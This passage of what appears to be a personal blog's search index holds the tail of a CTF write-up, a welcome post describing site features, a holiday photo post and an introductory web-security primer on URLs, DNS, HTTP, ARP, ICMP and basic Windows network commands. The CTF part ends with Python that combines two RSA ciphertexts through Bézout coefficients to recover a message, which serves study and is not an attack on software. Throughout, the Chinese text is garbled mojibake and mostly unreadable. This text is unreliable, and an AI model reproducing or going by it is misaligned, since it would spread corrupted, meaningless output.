exp_final1 * x_final + exp_final2 * y_final</span></span><br><span class="line">gcd_final, coeff_x_final, coeff_y_final = gcdext(exp_final1, exp_final2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ€ç»ˆè§£å¯†ç»“æœï¼Œå°† intermediate_m1 å’Œ intermediate_m2 çš„ç»„åˆè®¡ç®—å¾—åˆ°æ˜æ–‡ m</span></span><br><span class="line"><span class="comment"># è¿™é‡Œè§£å¯†è¿‡ç¨‹ä½¿ç”¨äº† m1 å’Œ m2 çš„è´ç¥–ç»„åˆï¼Œé€šè¿‡ m1^x_final * m2^y_final mod n å¾—åˆ° m</span></span><br><span class="line">final_message = <span class="built_in">pow</span>(intermediate_m1, coeff_x_final, n) * <span class="built_in">pow</span>(intermediate_m2, coeff_y_final, n) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†è§£å¯†åçš„æ•´æ•°è½¬æ¢ä¸ºå­—ç¬¦ä¸²å½¢å¼çš„æ˜æ–‡</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(final_message))</span><br></pre></td></tr></table></figure><p><img src="/img/CTF/ezCMA.png"></p><hr><p><strong>åè®°</strong></p><blockquote><p>æˆ‘é—®å¤©ï¼Œ<br>å¤©æ— è¨€ï¼›<br>æˆ‘é—®ä½›ï¼Œ<br>ä½›è¨€è‡ªæ¸¡æœ‰ç¼˜äºº<br>æˆ‘ï¼šâ€œå¤§å¸ˆï¼Œè¿™å¼€é—¨å—â€<br>å¤§å¸ˆï¼šâ€œä¸œè¥¿æ˜¯å¥½çš„ï¼Œå°±æ˜¯ä¸å¤Ÿè€â€<br>æˆ‘ï¼šâ€œå¤§å¸ˆï¼Œå“ªæ€ä¹ˆåŠå‘¢â€<br>å¤§å¸ˆï¼šâ€œä¸‹å»æ²‰æ·€å§â€</p></blockquote><p><img src="/img/CTF/win.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Interest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½ å¥½,åšå®¢</title>
      <link href="/2024/10/01/2024-10-3-firstpage/"/>
      <url>/2024/10/01/2024-10-3-firstpage/</url>
      
        <content type="html"><![CDATA[<h2 id="Welcome-to-my-blog"><a href="#Welcome-to-my-blog" class="headerlink" title="Welcome to my blog"></a><em><strong>Welcome to my blog</strong></em></h2><blockquote><p><strong>This is the first blog, as well as the first step.</strong><br>è®°å½•å­¦ä¹ ï¼Œè®°å½•ç”Ÿæ´»</p></blockquote><hr><h3 id="Special-function"><a href="#Special-function" class="headerlink" title="Special function"></a>Special function</h3><ul><li>ä¸»é¡µèœå•æ <br>å¢åŠ <strong>é¦–é¡µ</strong>ã€<strong>å½’æ¡£</strong>ã€<strong>æ ‡ç­¾</strong>ã€<strong>åˆ†ç±»</strong>ã€<strong>åˆ—è¡¨</strong>ã€<strong>ç•™è¨€æ¿</strong>ã€<strong>å‹é“¾</strong>ã€<strong>å…³äº</strong><br><strong>ä¸ªæ€§åŒ–icon&#x2F;å›¾æ ‡</strong><br><strong>æ–‡ç« æœç´¢</strong>åŠŸèƒ½<br><img src="/img/intro/1.png"></li><li>ä¸»é¡µé¡µé¢<br><strong>åŠ¨æ€</strong>æ ‡è¯­ï¼Œ<strong>ç¾æ–‡</strong>ä¸€åˆ™<br>æ¯æ¬¡åˆ·æ–°é¡µé¢è‡ªåŠ¨æ›´æ–°ç¾æ–‡<br><img src="/img/intro/2.png"></li><li>å¯çˆ±ç©å¶<br>å·¦ä¸‹è§’çš„å°ç©å¶ä¼š<strong>è·Ÿéšé¼ æ ‡ç§»åŠ¨</strong><br><strong>å°ç™½</strong>å’Œ<strong>å°å¥³å­©</strong>å½¢è±¡éšæœºä¸å®šæ—¶åˆ‡æ¢<br> <img src="/img/intro/3.png"><br> <img src="/img/intro/4.png"></li><li>day &amp; night<br>å³ä¸‹è§’è®¾ç½®æ åˆ‡æ¢ç™½å¤©å’Œé»‘å¤œ<br>å¤œé—´æ¨¡å¼ä¸‹è‡ªåŠ¨å¯åŠ¨éœ“è™¹ç¯ï¼Œæ ‡é¢˜ä¼š<strong>sparkling</strong>ğŸŒŸğŸŒŸğŸŒŸ<br>å¤œé—´æ¨¡å¼èƒŒæ™¯å‡ºç°<strong>æµæ˜Ÿé›¨</strong>ğŸŒ ğŸŒ ğŸŒ </li><li>è®¡æ—¶å™¨<br>æ–°å¢<strong>å»ºç«™è®¡æ—¶å™¨</strong>ï¼Œé¡µè„šæ–°å¢<strong>ä¸ªæ€§åŒ–Logo</strong><br><img src="/img/intro/5.png"></li><li>ä¸ªäººç®€ä»‹æ <br><strong>ä¸ªæ€§ç­¾å</strong><br><strong>æ¸å˜</strong>èƒŒæ™¯é¢œè‰²ï¼Œé»‘å¤œæ¨¡å¼è‡ªé€‚èƒŒæ™¯<br>è”ç³»æ–¹å¼æ–°å¢<strong>github</strong>,<strong>e-mail</strong>,<strong>wechat</strong>,<strong>qq</strong>,<strong>bilibili</strong></li><li>ä¾§æ»‘æ <br>æ–°å¢ğŸ“¢<strong>å…¬å‘Šæ </strong> ğŸ—‚ï¸<strong>åˆ†ç±»</strong> ğŸ”–<strong>æ ‡ç­¾</strong>ã€âœ‰ï¸<strong>å°ç«™èµ„è®¯</strong></li><li>ä¸€å›¾æµ<br>èƒŒæ™¯<strong>ä¸€å›¾æµ</strong>ï¼Œ<strong>é¡µé¢ç¾åŒ–</strong></li><li>é¼ æ ‡ç‚¹å‡»æ•ˆæœ<br>ç‚¹å‡»é¼ æ ‡å¯ä»¥<strong>è§¦å‘çˆ±å¿ƒ</strong>â¤ï¸<br>é¼ æ ‡åœç•™ä¼š<strong>èšé›†å½©è‰²é£˜å¸¦</strong>ï¼Œç‚¹å‡»ä¼š<strong>é‡Šæ”¾é£˜å¸¦</strong>ğŸ—ï¸</li><li>åè®®<br>æ–°å¢<strong>è½¬è½½åè®®</strong><br><strong>æ¸å˜è‰²</strong>èƒŒæ™¯æ¡†<br><img src="/img/intro/6.png"></li><li>æŠ•å–‚ä½œè€…<br>å¨±ä¹åŠŸèƒ½ğŸ¥°ğŸ¥°ğŸ¥°ï¼ˆå¦‚æœä½ æ„¿æ„ä¹Ÿå¯ä»¥è¯•è¯•æŠ•å–‚åŠŸèƒ½ğŸš€è€¶ï¼‰<br><img src="/img/intro/7.png"></li><li>éŸ³ä¹ğŸ¶ç”µå½±ğŸï¸<br>åŠŸèƒ½ä»åœ¨å¼€å‘ä¸­ğŸš²</li><li>å‹é“¾<br>æ¬¢è¿è”ç³»æˆ‘ï¼Œæ¬¢è¿<strong>äº’æ¢å‹é“¾</strong>ğŸ’•</li></ul><p>æ›´å¤šæœ‰è¶£çš„åŠŸèƒ½ç­‰å¾…ä½ æ¥æ¢ç´¢å“ŸğŸš€</p>]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸­ç§‹</title>
      <link href="/2024/09/15/2024-9-15-meet/"/>
      <url>/2024/09/15/2024-9-15-meet/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä¸€åˆ‡éƒ½æ˜¯æœ€å¥½çš„å®‰æ’</p></blockquote><ul><li>HUSTå°æœˆé¥¼<br><img src="/img/life/1.jpg"></li><li>mooncake<br><img src="/img/life/2.jpg"></li><li>gifts<br><img src="/img/life/3.jpg"></li><li>å¯çˆ±çš„å°æ¯å­ğŸ˜˜<br><img src="/img/life/4.jpg"></li><li>æ¯ä¸€ä¸ªå¨ƒå¨ƒéƒ½ä¸å­¤å•<br><img src="/img/life/5.jpg"></li></ul>]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Love </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webå®‰å…¨å¿«é€Ÿå…¥é—¨</title>
      <link href="/2024/08/01/2024-8-1-web/"/>
      <url>/2024/08/01/2024-8-1-web/</url>
      
        <content type="html"><![CDATA[<h3 id="ç½‘ç»œä¸­çš„ç›¸å…³æ¦‚å¿µ"><a href="#ç½‘ç»œä¸­çš„ç›¸å…³æ¦‚å¿µ" class="headerlink" title="ç½‘ç»œä¸­çš„ç›¸å…³æ¦‚å¿µ"></a>ç½‘ç»œä¸­çš„ç›¸å…³æ¦‚å¿µ</h3><p>1ï¼‰<a href="https://developer.mozilla.org/zh-CN/docs/Learn/Common_questions/Web_mechanics/What_is_a_URL">URL</a>ï¼ˆUniform Resourse Locatorï¼‰</p><p><strong>URL</strong> ä»£è¡¨ç€æ˜¯ç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼ˆUniform Resource Locatorï¼‰ã€‚URL æ— éå°±æ˜¯ä¸€ä¸ªç»™å®šçš„ç‹¬ç‰¹èµ„æºåœ¨ Web ä¸Šçš„åœ°å€ã€‚ç†è®ºä¸Šè¯´ï¼Œæ¯ä¸ªæœ‰æ•ˆçš„ URL éƒ½æŒ‡å‘ä¸€ä¸ªå”¯ä¸€çš„èµ„æºã€‚è¿™ä¸ªèµ„æºå¯ä»¥æ˜¯ä¸€ä¸ª HTML é¡µé¢ï¼Œä¸€ä¸ª CSS æ–‡æ¡£ï¼Œä¸€å¹…å›¾åƒï¼Œç­‰ç­‰ã€‚è€Œåœ¨å®é™…ä¸­ï¼Œä¹Ÿæœ‰ä¸€äº›ä¾‹å¤–ï¼Œæœ€å¸¸è§çš„æƒ…å†µå°±æ˜¯ä¸€ä¸ª URL æŒ‡å‘äº†ä¸å­˜åœ¨çš„æˆ–æ˜¯è¢«ç§»åŠ¨è¿‡çš„èµ„æºã€‚ç”±äºé€šè¿‡ URL å‘ˆç°çš„èµ„æºå’Œ URL æœ¬èº«ç”± Web æœåŠ¡å™¨å¤„ç†ï¼Œå› æ­¤ web æœåŠ¡å™¨çš„æ‹¥æœ‰è€…éœ€è¦è®¤çœŸåœ°ç»´æŠ¤èµ„æºä»¥åŠä¸å®ƒå…³è”çš„ URLã€‚</p><p>2ï¼‰<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D/86062">åŸŸå</a>ï¼ˆDomain Nameï¼‰</p><p>åŸŸåï¼ˆè‹±è¯­ï¼šDomain Nameï¼‰ï¼Œåˆç§°ç½‘åŸŸï¼Œæ˜¯ç”±ä¸€ä¸²ç”¨ç‚¹åˆ†éš”çš„åå­—ç»„æˆçš„<a href="https://baike.baidu.com/item/%E4%BA%92%E8%81%94%E7%BD%91/199186?fromModule=lemma_inlink">äº’è”ç½‘</a>ä¸ŠæŸä¸€å°<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA/140338?fromModule=lemma_inlink">è®¡ç®—æœº</a>æˆ–è®¡ç®—æœºç»„çš„åç§°ï¼Œç”¨äºåœ¨<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93/2987565?fromModule=lemma_inlink">æ•°æ®ä¼ è¾“</a>æ—¶å¯¹è®¡ç®—æœºçš„å®šä½æ ‡è¯†ï¼ˆæœ‰æ—¶ä¹ŸæŒ‡åœ°ç†ä½ç½®ï¼‰ã€‚ç”±äº<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80/150859?fromModule=lemma_inlink">IPåœ°å€</a>ä¸æ–¹ä¾¿è®°å¿†å¹¶ä¸”ä¸èƒ½æ˜¾ç¤ºåœ°å€ç»„ç»‡çš„åç§°å’Œæ€§è´¨ï¼Œäººä»¬è®¾è®¡å‡ºäº†åŸŸåï¼Œå¹¶é€šè¿‡<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F/2251573?fromModule=lemma_inlink">åŸŸåç³»ç»Ÿ</a>ï¼ˆDNSï¼ŒDomain Name Systemï¼‰æ¥å°†åŸŸåå’ŒIPåœ°å€ç›¸äº’<a href="https://baike.baidu.com/item/%E6%98%A0%E5%B0%84/20402621?fromModule=lemma_inlink">æ˜ å°„</a>ï¼Œä½¿äººæ›´æ–¹ä¾¿åœ°è®¿é—®äº’è”ç½‘ï¼Œè€Œä¸ç”¨å»è®°ä½èƒ½å¤Ÿè¢«æœºå™¨ç›´æ¥è¯»å–çš„IPåœ°å€æ•°ä¸²ã€‚</p><p>3ï¼‰IPåœ°å€å’ŒMACåœ°å€</p><p>IPåœ°å€ç”¨åœ¨TCP&#x2F;IPé€šä¿¡åè®®ä¸­æ ‡è®°æ¯å°è®¡ç®—æœºçš„åœ°å€ï¼ˆåŸºäºé€»è¾‘ï¼‰</p><p>MACåœ°å€ç”±ç½‘å•†å†™åœ¨ç½‘å¡çš„BIOSé‡Œï¼ˆåŸºäºç‰©ç†ï¼‰</p><h3 id="è®¤è¯†ç½‘ç»œé€šä¿¡åè®®"><a href="#è®¤è¯†ç½‘ç»œé€šä¿¡åè®®" class="headerlink" title="è®¤è¯†ç½‘ç»œé€šä¿¡åè®®"></a>è®¤è¯†ç½‘ç»œé€šä¿¡åè®®</h3><p>1ï¼‰<a href="https://baike.baidu.com/item/HTTP?fromModule=lemma_search-box"><em>HTTP</em></a></p><p>è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼ˆHypertext Transfer Protocolï¼ŒHTTPï¼‰æ˜¯ä¸€ä¸ªç®€å•çš„è¯·æ±‚-å“åº”åè®®ï¼Œå®ƒé€šå¸¸è¿è¡Œåœ¨<a href="https://baike.baidu.com/item/TCP/33012?fromModule=lemma_inlink">TCP</a>ä¹‹ä¸Šã€‚å®ƒæŒ‡å®šäº†å®¢æˆ·ç«¯å¯èƒ½å‘é€ç»™æœåŠ¡å™¨ä»€ä¹ˆæ ·çš„æ¶ˆæ¯ä»¥åŠå¾—åˆ°ä»€ä¹ˆæ ·çš„å“åº”ã€‚è¯·æ±‚å’Œå“åº”æ¶ˆæ¯çš„å¤´ä»¥<a href="https://baike.baidu.com/item/ASCII/309296?fromModule=lemma_inlink">ASCII</a>å½¢å¼ç»™å‡ºï¼›è€Œæ¶ˆæ¯å†…å®¹åˆ™å…·æœ‰ä¸€ä¸ªç±»ä¼¼<a href="https://baike.baidu.com/item/MIME/2900607?fromModule=lemma_inlink">MIME</a>çš„æ ¼å¼ã€‚è¶…æ–‡æœ¬ä¼ è¾“åè®®æ˜¯ä¸€ç§ç”¨äºåˆ†å¸ƒå¼ã€åä½œå¼å’Œè¶…åª’ä½“ä¿¡æ¯ç³»ç»Ÿçš„åº”ç”¨å±‚åè®®ï¼Œæ˜¯ä¸‡ç»´ç½‘WWWï¼ˆWorld Wide Webï¼‰çš„æ•°æ®é€šä¿¡çš„åŸºç¡€ã€‚</p><p>2ï¼‰<a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE/212915?fromModule=lemma_search-box"><em>TCP&#x2F;IP</em></a></p><p>3ï¼‰<a href="https://baike.baidu.com/item/IP/224599">IP</a></p><p>4ï¼‰<a href="https://baike.baidu.com/item/ARP/609343?fromModule=lemma_search-box"><em>ARP</em></a></p><p>åœ°å€è§£æåè®®ï¼Œå³ARPï¼ˆAddress Resolution Protocolï¼‰ï¼Œæ˜¯æ ¹æ®<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80/0?fromModule=lemma_inlink">IPåœ°å€</a>è·å–<a href="https://baike.baidu.com/item/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/2129?fromModule=lemma_inlink">ç‰©ç†åœ°å€</a>çš„ä¸€ä¸ª<a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE/0?fromModule=lemma_inlink">TCP&#x2F;IPåè®®</a>ã€‚<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">ä¸»æœº</a>å‘é€ä¿¡æ¯æ—¶å°†åŒ…å«ç›®æ ‡IPåœ°å€çš„ARPè¯·æ±‚å¹¿æ’­åˆ°å±€åŸŸç½‘ç»œä¸Šçš„æ‰€æœ‰ä¸»æœºï¼Œå¹¶æ¥æ”¶è¿”å›æ¶ˆæ¯ï¼Œä»¥æ­¤ç¡®å®šç›®æ ‡çš„ç‰©ç†åœ°å€ï¼›æ”¶åˆ°è¿”å›æ¶ˆæ¯åå°†è¯¥IPåœ°å€å’Œç‰©ç†åœ°å€å­˜å…¥æœ¬æœºARPç¼“å­˜ä¸­å¹¶ä¿ç•™ä¸€å®šæ—¶é—´ï¼Œä¸‹æ¬¡è¯·æ±‚æ—¶ç›´æ¥æŸ¥è¯¢ARPç¼“å­˜ä»¥èŠ‚çº¦èµ„æºã€‚</p><p>5ï¼‰<a href="https://baike.baidu.com/item/ICMP?fromModule=lemma_search-box">ICMP</a></p><p>ICMPï¼ˆInternet Control Message Protocolï¼‰Internetæ§åˆ¶<a href="https://baike.baidu.com/item/%E6%8A%A5%E6%96%87/3164352?fromModule=lemma_inlink">æŠ¥æ–‡</a>åè®®ã€‚å®ƒæ˜¯<a href="https://baike.baidu.com/item/TCP%2FIP/214077?fromModule=lemma_inlink">TCP&#x2F;IP</a>åè®®ç°‡çš„ä¸€ä¸ªå­åè®®ï¼Œç”¨äºåœ¨IP<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">ä¸»æœº</a>ã€<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1%E5%99%A8/108294?fromModule=lemma_inlink">è·¯ç”±å™¨</a>ä¹‹é—´ä¼ é€’æ§åˆ¶æ¶ˆæ¯ã€‚æ§åˆ¶æ¶ˆæ¯æ˜¯æŒ‡ç½‘ç»œé€šä¸é€šã€<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">ä¸»æœº</a>æ˜¯å¦å¯è¾¾ã€<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1/363497?fromModule=lemma_inlink">è·¯ç”±</a>æ˜¯å¦å¯ç”¨ç­‰ç½‘ç»œæœ¬èº«çš„æ¶ˆæ¯ã€‚è¿™äº›æ§åˆ¶æ¶ˆæ¯è™½ç„¶å¹¶ä¸ä¼ è¾“ç”¨æˆ·æ•°æ®ï¼Œä½†æ˜¯å¯¹äºç”¨æˆ·æ•°æ®çš„ä¼ é€’èµ·ç€é‡è¦çš„ä½œç”¨ã€‚</p><h3 id="ç½‘ç»œè®¾å¤‡ä¿¡æ¯è·å–"><a href="#ç½‘ç»œè®¾å¤‡ä¿¡æ¯è·å–" class="headerlink" title="ç½‘ç»œè®¾å¤‡ä¿¡æ¯è·å–"></a>ç½‘ç»œè®¾å¤‡ä¿¡æ¯è·å–</h3><p>1ï¼‰è·å–IPåœ°å€</p><p>cmd -&gt; ipconfig</p><p>2ï¼‰è·å–ç‰©ç†åœ°å€</p><p>cmd -&gt; ipconfig&#x2F;all</p><p>3ï¼‰æŸ¥çœ‹ç³»ç»Ÿå¼€æ”¾ç«¯å£</p><p>cmd -&gt; netstat -a -n</p><p>4ï¼‰æŸ¥çœ‹ç³»ç»Ÿæ³¨å†Œè¡¨ä¿¡æ¯</p><p>ä½¿ç”¨ç®¡ç†å‘˜æƒé™è¿è¡Œcmd -&gt; regedit</p><p>5ï¼‰è·å–ç³»ç»Ÿè¿›ç¨‹ä¿¡æ¯</p><p>win+R -&gt; ä»»åŠ¡ç®¡ç†å™¨ï¼ˆå¿«æ·é”® Ctrl + Del + Altï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> Interest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
